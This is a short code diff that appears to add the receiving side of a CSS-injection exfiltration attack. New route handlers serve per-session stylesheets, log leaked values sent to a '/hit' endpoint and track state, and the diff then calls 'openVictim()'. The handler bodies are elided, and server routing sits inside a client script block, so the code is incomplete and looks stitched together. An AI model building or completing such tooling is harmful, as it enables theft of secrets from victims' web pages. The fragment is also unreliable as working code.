@@ -60,7 +60,30 @@ async function poll() {
   }
   setTimeout(poll, 80);
 }
+const mStream = url.pathname.match(/^\/stream\/([^/]+)\.css$/);
+if (mStream) {
+  const sid = mStream[1];
+  console.log("STREAM", sid, request.headers.get("user-agent"));
+  const session = getSession(sid);
+  ...
+}
 
+const mHit = url.pathname.match(/^\/hit\/([^/]+)$/);
+if (mHit) {
+  const sid = mHit[1];
+  const x = url.searchParams.get("x") || "";
+  console.log("HIT", sid, x);
+  const session = getSession(sid);
+  ...
+}
+
+const mState = url.pathname.match(/^\/state\/([^/]+)$/);
+if (mState) {
+  const sid = mState[1];
+  console.log("STATE", sid);
+  const session = getSession(sid);
+  ...
+}
 openVictim();
 poll();
 </script>
